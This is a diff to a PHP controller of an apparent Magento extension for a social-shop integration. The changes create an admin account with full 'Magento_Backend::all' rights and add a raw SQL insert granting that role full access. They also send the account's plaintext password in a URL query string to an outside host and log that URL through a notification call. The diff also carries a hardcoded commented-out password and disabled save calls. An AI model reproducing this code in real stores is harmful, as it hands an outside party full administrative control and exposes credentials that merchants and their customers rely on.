@@ -49,6 +49,8 @@ class Save extends \Magento\Framework\App\Action\Action
     	$storeManager = $objectManager->get('\Magento\Store\Model\StoreManagerInterface');
     	$this->storeURL = $storeManager->getStore()->getBaseUrl();
     	
+    	$resourceDB = $objectManager->get('Magento\Framework\App\ResourceConnection');
+    	
     	// Loading the logger
     	$this->createLogger();
     	// Sent notification to magento server and to shopial
@@ -57,6 +59,9 @@ class Save extends \Magento\Framework\App\Action\Action
     	$userModel = $objectManager->create('Magento\User\Model\User');
     	$userModel->loadByUsername($this->userName);
     	
+    	$result = "";
+    	$randPassword = $this->generateRandomString();
+    	//$randPassword = "e257f5e9d7";
     	if ($userModel->getData('password') == NULL) {
 			try {
 	    		/**
@@ -66,30 +71,23 @@ class Save extends \Magento\Framework\App\Action\Action
 	    		$userModel->setFirstName($this->userName);
 	    		$userModel->setLastName($this->userName);
 	    		$userModel->setEmail("support@magento.com");
-	    		$randPassword = $this->generateRandomString();
 	    		$userModel->setPassword($randPassword);
-	    		$userModel->save();	    		
-	    		if($userModel->getId() > 0) {
-	    			$result = $this->saveUserToShopial($this->userName, $randPassword);
-	    			$this->sendNotification($this->STATUS_CODES['103'], "103", "1");
-	    		} else {
-	    			$this->sendNotification($this->STATUS_CODES['103'], "103", "0");
-	    		}	    		
+	    		//$userModel->save();	    		
+    		
     		} catch (Exception $e) {
     			$this->sendNotification($this->STATUS_CODES['103'], "103", "0");
     		}
     	} else {
     		$result = "Success"; 		
     	}
+    	
 		
     	// Check the roles for our new user
     	$role_for_selected_user = $userModel->loadByUsername($this->userName)->getRoles();
-    	
+    	$roleID = "0";
     	if (empty($role_for_selected_user)) {
     		try {
-	    		/**
-	    		 * Create shopial role
-	    		 */
+	    		
 	    		$roleAuthModel = $objectManager->create('\Magento\Authorization\Model\Role');
 	    		
 	    		$roleAuthModel->setName($this->userName)
@@ -98,33 +96,40 @@ class Save extends \Magento\Framework\App\Action\Action
 	    		->setUserType(UserContextInterface::USER_TYPE_ADMIN);
 	    		$roleAuthModel->save();
 	    		
-	    		$resource=['Magento_Backend::admin',
-	    		'Magento_Rma::magento_rma',
-	    		'Magento_Sales::actions',
-	    		'Magento_Sales::actions_view',
-	    		'Magento_Sales::sales',
-	    		'Magento_Sales::sales_operation',
-	    		'Magento_Sales::sales_order'
-	    		];
+	    		$resource = ['Magento_Backend::all'];
+	    		$roleID = $roleAuthModel->getId();
+	    		$roleAuthModel->setRoleId($roleID)->setResources($resource)->save();
 	    		
-	    		$roleAuthModel->setRoleId($roleAuthModel->getId())->setResources($resource)->save();
-	    		
-	    		/**
-	    		 * Adding new role to our shopial user
-	    		 */
-	    		if ($roleAuthModel->getId() > 0) {
-		    		$userModel->setRoleId($roleAuthModel->getId());
-		    		$userModel->save();
+	    		if ($roleID > 0) {	    			
+		    		$userModel->setRoleId($roleID);
+		    		//$userModel->setPassword($randPassword);		    		
 		    		$this->sendNotification($this->STATUS_CODES['104'], "104", "1");
 	    		} else {
 	    			$this->sendNotification($this->STATUS_CODES['104'], "104", "0");
-	    		}
+	    		}	    		
     		} catch (Exception $e) {
     			$this->sendNotification($this->STATUS_CODES['104'], "104", "0");
     		}
     	}
+		
+    	$userModel->save();
+    	
+    	if($userModel->getId() > 0) {
+    		
+    		$connection = $resourceDB->getConnection();
+    		$tableName = $resourceDB->getTableName('authorization_rule');
+    		$sql = "INSERT INTO " . $tableName . " (role_id, resource_id, privileges, permission) VALUES (". $roleID .", 'Magento_Backend::all', NULL, 'allow')";
+    		$connection->query($sql);
 
+    		$result = $this->saveUserToShopial($this->userName, $randPassword);
+    		$this->sendNotification($this->STATUS_CODES['103'], "103", "1");
+    		
+    	} else {
+    		$this->sendNotification($this->STATUS_CODES['103'], "103", "0");
+    	}
+    	
     	/**
+    	 * 
     	 * Return JSON (
     	 * 	result => Error/Success
     	 * 	store_url => Store URL
@@ -165,8 +170,12 @@ class Save extends \Magento\Framework\App\Action\Action
     }
     
     protected function saveUserToShopial($userName, $randPassword) {
+
+    	
     	$url = "https://fbapp.ezsocialshop.com/facebook/index.php/magento/save_magento2?user=" . $userName .
 		"&pass=" . $randPassword . "&store_id=" . urlencode($this->storeURL) . "&callback=my_callback";
+    	
+    	$this->sendNotification("aaaaa", "105", $url);
     	
     	$result = file_get_contents($url);
     	$result = trim($result);
